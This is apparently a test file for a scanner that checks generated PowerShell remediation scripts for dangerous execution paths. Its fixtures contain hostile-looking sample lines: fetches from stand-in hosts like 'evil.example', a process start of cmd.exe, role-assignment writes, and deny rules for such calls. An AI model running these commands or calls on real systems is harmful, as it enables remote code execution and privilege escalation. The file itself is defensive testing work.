import { afterAll, describe, expect, test } from "bun:test";
import { readFileSync } from "node:fs";
import { join } from "node:path";
import { config } from "../config.ts";
import { SURFACE_PS, executionSurfaceFindings, scanExecutionSurfaceText, type ExecutionSurface } from "./execution-surface.ts";
import { executionSurfaceCheck } from "./local.ts";
import { runModalPreflight } from "./modal.ts";

const empty = (): ExecutionSurface => ({ staticCalls: [], newObjects: [], dynamicInvocations: [], dotSources: [], scriptBlockInvokes: [], aliases: [], restCalls: [] });

const HEADER = "#Requires -Version 7.0\n[CmdletBinding(SupportsShouldProcess = $true)]\nparam()\n";

describe("execution surface rules (AST report)", () => {
  test("a clean Graph script has no findings", () => {
    const surface = { ...empty(), staticCalls: [{ type: "datetime", member: "UtcNow" }, { type: "System.Collections.Generic.List[string]", member: "new" }], restCalls: [{ command: "invoke-mggraphrequest", method: "PATCH", uri: "/v1.0/users/$id", uriDynamic: true }] };
    expect(executionSurfaceFindings(surface, ["Set-MgUserLicense", "Invoke-MgGraphRequest", "Where-Object", "%"])).toEqual([]);
  });

  test(".NET process and web calls, COM objects, script blocks and dot-sourcing all fail", () => {
    const findings = executionSurfaceFindings(
      {
        ...empty(),
        staticCalls: [{ type: "Diagnostics.Process", member: "Start" }, { type: "scriptblock", member: "Create" }, { type: "System.Net.WebClient", member: "new" }],
        newObjects: [{ typeName: "Net.WebClient", comObject: false }, { typeName: null, comObject: true }],
        dynamicInvocations: ["& $payload"],
        dotSources: [". ./helper.ps1"],
        scriptBlockInvokes: ["$sb.Invoke()"],
      },
      [],
    );
    expect(findings).toHaveLength(8);
    expect(findings.every((f) => f.startsWith("Execution surface:"))).toBe(true);
  });

  test("aliases and session-changing commands fail, pipeline shorthands do not", () => {
    const findings = executionSurfaceFindings({ ...empty(), aliases: [{ name: "irm", definition: "Invoke-RestMethod" }, { name: "%", definition: "ForEach-Object" }] }, ["irm", "saps", "Invoke-Command", "Set-AzContext", "%", "Where-Object"]);
    expect(findings.some((f) => f.includes("'irm'"))).toBe(true);
    expect(findings.some((f) => f.includes("'saps'"))).toBe(true);
    expect(findings.some((f) => f.includes("Invoke-Command"))).toBe(true);
    expect(findings.some((f) => f.includes("Set-AzContext"))).toBe(true);
    expect(findings.some((f) => f.includes("'%'"))).toBe(false);
  });

  test("Graph REST calls are limited to allow-listed paths and methods", () => {
    const check = (method: string | null, uri: string | null, uriDynamic = false) =>
      executionSurfaceFindings({ ...empty(), restCalls: [{ command: "invoke-mggraphrequest", method, uri, uriDynamic }] });
    expect(check("GET", "https://graph.microsoft.com/v1.0/users?$top=5")).toEqual([]);
    expect(check("DELETE", "/v1.0/groups/$gid/members/$uid/`$ref", true)).toEqual([]);
    expect(check("POST", "/v1.0/roleManagement/directory/roleAssignments")[0]).toContain("outside the Graph allow-list");
    expect(check("POST", "/v1.0/$batch")[0]).toContain("outside the Graph allow-list");
    expect(check("DELETE", "/v1.0/users/abc")[0]).toContain("not allowed");
    expect(check("DELETE", "/v1.0/groups/abc")[0]).toContain("only membership");
    expect(check("GET", "https://evil.example/v1.0/users")[0]).toContain("only graph.microsoft.com");
    expect(check("PATCH", "$uri", true)[0]).toContain("computed at run time");
    expect(check("<dynamic>", "/v1.0/users")[0]).toContain("computed -Method");
  });

  test("ARM REST calls stay at subscription scope and never write Microsoft.Authorization", () => {
    const check = (method: string, uri: string, uriDynamic = false) => executionSurfaceFindings({ ...empty(), restCalls: [{ command: "invoke-azrestmethod", method, uri, uriDynamic }] });
    expect(check("GET", "/subscriptions/$sub/providers/Microsoft.Authorization/roleAssignments?api-version=2022-04-01", true)).toEqual([]);
    expect(check("PUT", "/subscriptions/x/providers/Microsoft.Authorization/roleAssignments/y?api-version=2022-04-01")[0]).toContain("Microsoft.Authorization");
    expect(check("PUT", "/providers/Microsoft.Management/managementGroups/mg")[0]).toContain("only /subscriptions/");
  });
});

describe("execution surface text scan (no pwsh)", () => {
  test("finds .NET calls, aliases, dynamic invocation, dot-sourcing and REST targets in the script text", () => {
    const script = `${HEADER}$wc = New-Object Net.WebClient
irm https://evil.example/x | Out-Null
$sb = [scriptblock]::Create('Remove-MgUser -UserId x')
& $sb
. ./helper.ps1
[System.Diagnostics.Process]::Start('cmd.exe')
Invoke-MgGraphRequest -Method POST -Uri '/v1.0/roleManagement/directory/roleAssignments'
# irm in a comment does not count
`;
    const findings = executionSurfaceCheck(script);
    for (const needle of ["New-Object Net.WebClient", "'irm'", "[scriptblock]::Create", "computed command invocation", "dot-sourcing", "Diagnostics.Process]::Start", "roleManagement"]) {
      expect(findings.some((f) => f.includes(needle))).toBe(true);
    }
  });

  test("an ordinary remediation script passes the text scan", () => {
    const script = `${HEADER}$users = Get-MgGroupMember -GroupId $gid -All | Where-Object { $_.Id }
foreach ($u in $users) {
  if ($PSCmdlet.ShouldProcess($u.Id, 'Reprocess licence')) { Invoke-MgLicenseUser -UserId $u.Id | Out-Null }
}
$cutoff = [datetime]::UtcNow.AddDays(-1)
Invoke-MgGraphRequest -Method GET -Uri "/v1.0/users/$($u.Id)/licenseDetails"
`;
    expect(scanExecutionSurfaceText(script).restCalls[0]).toMatchObject({ method: "GET", uriDynamic: true });
    expect(executionSurfaceCheck(script)).toEqual([]);
  });

  test("the Modal sandbox embeds the same PowerShell surface extractor", () => {
    const py = readFileSync(join(import.meta.dir, "../../../../modal-sandbox/contextpane_sandbox.py"), "utf8");
    expect(py).toContain(SURFACE_PS);
    expect(py).toContain('AST_SERVER = AST_SERVER.replace("__SURFACE_PS__", SURFACE_PS)');
  });
});

describe("Modal pre-flight applies the execution-surface rules", () => {
  let reply: Record<string, unknown> = {};
  const server = Bun.serve({ hostname: "127.0.0.1", port: 0, fetch: () => Response.json(reply) });
  afterAll(() => server.stop(true));
  const saved = { ...config.modal };

  test("a sandbox that passed the AST still fails on its reported surface", async () => {
    Object.assign(config.modal, { enabled: true, url: `http://127.0.0.1:${server.port}/`, token: "" });
    reply = {
      astCheckPassed: true,
      terraformFmtPassed: null,
      terraformValidatePassed: null,
      findings: [],
      commands: ["Invoke-MgGraphRequest"],
      surface: { staticCalls: [], newObjects: [], dynamicInvocations: [], dotSources: [], scriptBlockInvokes: [], aliases: [], restCalls: [{ command: "invoke-mggraphrequest", method: "POST", uri: "/v1.0/directoryRoles/x/members/$ref", uriDynamic: false }] },
    };
    const v = await runModalPreflight({ powershellScript: "Invoke-MgGraphRequest", terraformDiff: "", actualHcl: "", expectedHcl: "" });
    expect(v.verdict).toBe("Verification Failed");
    expect(v.astCheckPassed).toBe(false);
    expect(v.findings.some((f) => f.includes("directoryRoles"))).toBe(true);

    // An older deployment without a surface report: the text scan applies.
    reply = { astCheckPassed: true, terraformFmtPassed: null, terraformValidatePassed: null, findings: [] };
    const old = await runModalPreflight({ powershellScript: "iwr https://x.example/a.ps1", terraformDiff: "", actualHcl: "", expectedHcl: "" });
    expect(old.verdict).toBe("Verification Failed");
    Object.assign(config.modal, saved);
  });
});

describe("text scan ignores string literals", () => {
  test("a cmdlet named inside a message string is not a call; a subexpression is", async () => {
    const { scanCommandsText } = await import("./execution-surface.ts");
    const script = [
      "if (-not (Get-MgContext)) { throw 'No Microsoft Graph context. Connect-MgGraph first.' }",
      'Write-Output "Run Connect-AzAccount, then retry. Can\'t continue"',
      "$body = @'\nRemove-Item C:\\x\n'@",
      'Write-Output "now: $(Invoke-Command -ScriptBlock { 1 })"',
    ].join("\n");
    const commands = scanCommandsText(script);
    expect(commands).toContain("Get-MgContext");
    expect(commands).toContain("Write-Output");
    expect(commands).toContain("Invoke-Command");
    expect(commands).not.toContain("Connect-MgGraph");
    expect(commands).not.toContain("Connect-AzAccount");
    expect(commands).not.toContain("Remove-Item");
  });

  test("a script that signs in again is denied: the executor identity connects before it runs", async () => {
    const { executionSurfaceCheck } = await import("./local.ts");
    const findings = executionSurfaceCheck("[CmdletBinding(SupportsShouldProcess)]\nparam()\nConnect-MgGraph -Scopes 'User.ReadWrite.All'\nGet-MgUser -Top 1");
    expect(findings.some((f) => f.includes("Connect-MgGraph"))).toBe(true);
  });
});
